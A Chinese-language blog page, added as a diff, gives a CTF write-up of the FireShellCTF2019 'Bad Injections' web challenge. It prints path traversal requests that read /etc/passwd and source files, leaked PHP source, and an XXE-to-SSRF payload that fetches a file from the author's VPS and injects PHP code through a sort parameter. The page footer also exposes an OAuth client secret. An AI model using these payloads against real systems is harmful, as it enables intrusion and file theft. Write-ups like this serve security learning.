@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            FireShellCTF2019 Bad Injections解题记录
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/"> 
+                    FireShellCTF2019 Bad Injections解题记录 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-30   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#FireShellCTF2019-Bad-Injections解题记录"><span class="toc-list-text">FireShellCTF2019 Bad Injections解题记录</span></a></li></ol>
+</div>
+            <div class="content">
+                <h1 id="FireShellCTF2019-Bad-Injections解题记录"><a href="#FireShellCTF2019-Bad-Injections解题记录" class="headerlink" title="FireShellCTF2019 Bad Injections解题记录"></a>FireShellCTF2019 Bad Injections解题记录</h1><p>原文投稿安全客：<a href="https://www.anquanke.com/post/id/170381" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170381</a></p>
+<p>题目名称：Bad Injections</p>
+<p>题目地址：<a href="http://68.183.31.62:94" target="_blank" rel="noopener">http://68.183.31.62:94</a></p>
+<p>貌似现在还没有关环境，这是整场比赛最简单的Web题…Web题质量很高，表哥们可以趁环境在去爽一下</p>
+<p>主页面有四个功能，纯静态页面。右键about页面源码信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7566b0a62.png" alt></p>
+<p>给个本地web目录</p>
+<p>接着在list页面的源码里发现信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7581ec7bc.png" alt></p>
+<p>因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc</span><br></pre></td></tr></table></figure>
+
+<p>这里让<code>hash = md5(file)</code>，成功下载到了/etc/passwd<br><img src="https://i.loli.net/2019/01/28/5c4e75df5ff3d.png" alt></p>
+<p>尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败…</p>
+<p>看到之前list下载的test.txt内容是这样的<br><img src="https://i.loli.net/2019/01/28/5c4e75f994d2c.png" alt></p>
+<p>down一下download的源码，顺便fuzz一下Controllers的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260</span><br></pre></td></tr></table></figure>
+
+<p>字典只跑出来了个admin.php<br><img src="https://i.loli.net/2019/01/28/5c4e7631e6291.png" alt></p>
+<p>看了源码感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag所以利用XXE没什么卵用，应该就是代码注入点，但是要加载外部文本来引入正确xml文本才能进入函数判断。</p>
+<p>尝试请求admin?url=xxx&amp;order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8</span><br></pre></td></tr></table></figure>
+
+<p>/app/index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;display_errors&apos;,1);</span><br><span class="line">ini_set(&apos;display_startup_erros&apos;,1);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">require_once(&apos;Routes.php&apos;);</span><br><span class="line"></span><br><span class="line">function __autoload($class_name)&#123;</span><br><span class="line">  if(file_exists(&apos;./classes/&apos;.$class_name.&apos;.php&apos;))&#123;</span><br><span class="line">    require_once &apos;./classes/&apos;.$class_name.&apos;.php&apos;;</span><br><span class="line">  &#125;else if(file_exists(&apos;./Controllers/&apos;.$class_name.&apos;.php&apos;))&#123;</span><br><span class="line">    require_once &apos;./Controllers/&apos;.$class_name.&apos;.php&apos;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再去读路由/app/Routes.php，看看是个什么狗屁规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Route::set(&apos;index.php&apos;,function()&#123;</span><br><span class="line">  Index::createView(&apos;Index&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;index&apos;,function()&#123;</span><br><span class="line">  Index::createView(&apos;Index&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;about-us&apos;,function()&#123;</span><br><span class="line">  AboutUs::createView(&apos;AboutUs&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;contact-us&apos;,function()&#123;</span><br><span class="line">  ContactUs::createView(&apos;ContactUs&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;list&apos;,function()&#123;</span><br><span class="line">  ContactUs::createView(&apos;Lista&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;verify&apos;,function()&#123;   </span><br><span class="line">  if(!isset($_GET[&apos;file&apos;]) &amp;&amp; !isset($_GET[&apos;hash&apos;]))&#123;</span><br><span class="line">    Verify::createView(&apos;Verify&apos;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    Verify::verifyFile($_GET[&apos;file&apos;],$_GET[&apos;hash&apos;]);  //设置session，file和hash对应请求文件</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Route::set(&apos;download&apos;,function()&#123;</span><br><span class="line">  if(isset($_REQUEST[&apos;file&apos;]) &amp;&amp; isset($_REQUEST[&apos;hash&apos;]))&#123;</span><br><span class="line">    echo Download::downloadFile($_REQUEST[&apos;file&apos;],$_REQUEST[&apos;hash&apos;]);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    echo &apos;jdas&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;verify/download&apos;,function()&#123;</span><br><span class="line">  Verify::downloadFile($_REQUEST[&apos;file&apos;],$_REQUEST[&apos;hash&apos;]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Route::set(&apos;custom&apos;,function()&#123;</span><br><span class="line">  $handler = fopen(&apos;php://input&apos;,&apos;r&apos;);</span><br><span class="line">  $data = stream_get_contents($handler); // xml</span><br><span class="line">  if(strlen($data) &gt; 1)&#123;</span><br><span class="line">    Custom::Test($data);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    Custom::createView(&apos;Custom&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;admin&apos;,function()&#123;</span><br><span class="line">  if(!isset($_REQUEST[&apos;rss&apos;]) &amp;&amp; !isset($_REQUES[&apos;order&apos;]))&#123;</span><br><span class="line">    Admin::createView(&apos;Admin&apos;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos; || $_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;::1&apos;)&#123;</span><br><span class="line">      Admin::sort($_REQUEST[&apos;rss&apos;],$_REQUEST[&apos;order&apos;]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">     echo &quot;;(&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;custom/sort&apos;,function()&#123;</span><br><span class="line">  Custom::sort($_REQUEST[&apos;rss&apos;],$_REQUEST[&apos;order&apos;]);</span><br><span class="line">&#125;);</span><br><span class="line">Route::set(&apos;index&apos;,function()&#123;</span><br><span class="line"> Index::createView(&apos;Index&apos;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>原来我只下载了download和admin页面，还有其它功能页面没下载到，看到了玄学的admin规则如下，原来只有本地才能请求到sort函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Route::set(&apos;admin&apos;,function()&#123;</span><br><span class="line">  if(!isset($_REQUEST[&apos;rss&apos;]) &amp;&amp; !isset($_REQUES[&apos;order&apos;]))&#123;</span><br><span class="line">    Admin::createView(&apos;Admin&apos;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos; || $_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;::1&apos;)&#123;</span><br><span class="line">      Admin::sort($_REQUEST[&apos;rss&apos;],$_REQUEST[&apos;order&apos;]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">     echo &quot;;(&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>找一下其他利用，再看Custom</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Route::set(&apos;custom&apos;,function()&#123;</span><br><span class="line">  $handler = fopen(&apos;php://input&apos;,&apos;r&apos;);</span><br><span class="line">  $data = stream_get_contents($handler); </span><br><span class="line">  if(strlen($data) &gt; 1)&#123;</span><br><span class="line">    Custom::Test($data);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    Custom::createView(&apos;Custom&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>Custom::Test</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Custom extends Controller&#123;</span><br><span class="line">  public static function Test($string)&#123;</span><br><span class="line">      $root = simplexml_load_string($string,&apos;SimpleXMLElement&apos;,LIBXML_NOENT);</span><br><span class="line">      $test = $root-&gt;name;</span><br><span class="line">      echo $test;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用<br><img src="https://i.loli.net/2019/01/28/5c4e7655ea8f6.png" alt></p>
+<p>联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板</p>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt; </span><br><span class="line">&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;file;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/01/28/5c4e7677a9567.png" alt><br>admin页面确实file_get_contents到了我vps的xxe文本。</p>
+<p>尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行</p>
+<p><code>http://vps/xxe.txt</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;link&gt;@hpdoger.me&lt;/link&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;link&gt;@souhu.com&lt;/link&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>POC</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt; </span><br><span class="line">&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;file;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/01/28/5c4e768d57f89.png" alt></p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/01/30/FireShellCTF2019 Bad Injections解题记录/">https://hpdoger.cn/2019/01/30/FireShellCTF2019 Bad Injections解题记录/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2019/02/02/Echsop2.7.x几处漏洞分析/">  Echsop2.7.x几处漏洞分析</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/01/26/安恒杯月赛19新年场WriteUp/"> 安恒杯月赛19新年场WriteUp </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Wed Jan 30 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
